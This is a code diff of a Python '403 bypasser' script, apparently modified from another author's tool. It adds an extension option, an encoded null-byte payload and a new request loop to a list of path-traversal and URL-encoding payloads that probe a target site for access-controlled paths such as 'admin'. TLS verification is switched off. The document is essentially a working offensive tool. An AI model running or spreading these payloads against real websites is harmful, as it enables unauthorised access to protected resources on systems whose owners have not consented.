@@ -13,19 +13,22 @@ print("""\u001b[36m
   |_|___|___|  |_____|_  |  _|__,|___|___|___|_|  
                      |___|_|        \u001b[0m                  
 						
-			\033[1;33;36m @channyeinwai(1.0) \033[1;33;0m
+			\033[1;33;36m originally written by @channyeinwai.
+				modded by k3rubin \m/ \033[1;33;0m
 	""")
 warnings.filterwarnings('ignore', message='Unverified HTTPS request')
 
-parser = argparse.ArgumentParser(description="403 Bypasser : python 403-bypass.py -u https://www.example.com -p admin")
+parser = argparse.ArgumentParser(description="403 Bypasser : python 403-bypass.py -u https://www.example.com -p admin -x .pdf")
 parser.add_argument('-u', '--url' , help = 'Provide url ' , required=True)
 parser.add_argument('-p' , '--path' , help = 'Provide the path' , required=True)
+parser.add_argument('-x' , '--extension' , help = 'Provide extra payload/extension' , required=False)
 args = parser.parse_args()
 
 url = args.url
 path = args.path
+extension = args.extension
 
-payloads = ["/","/*","/%2f/","/./","./.","/*/","?","??","&","#","%","%20","%09","/..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23",".json"]
+payloads = ["/","/*","/%2f/","/./","./.","/*/","?","??","&","#","%","%20","%09","%2500","/..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23",".json"]
 
 full_url = url+'/'+path
 slash_path = '/'+path
@@ -44,6 +47,15 @@ for payload in payloads:
 		full_url3 = url+payload+path
 		r = requests.get(full_url3 , allow_redirects=False , verify = False , timeout = 5)
 		print(full_url3 + ' : ' + str(r.status_code))
+
+	except Exception:
+		pass
+
+for payload in payloads:
+	try:
+		full_url4 = url+slash_path+payload+extension
+		req = requests.get(full_url4 , allow_redirects=False , verify = False , timeout = 5)
+		print(full_url4 + ' : ' + str(req.status_code))
 
 	except Exception:
 		pass
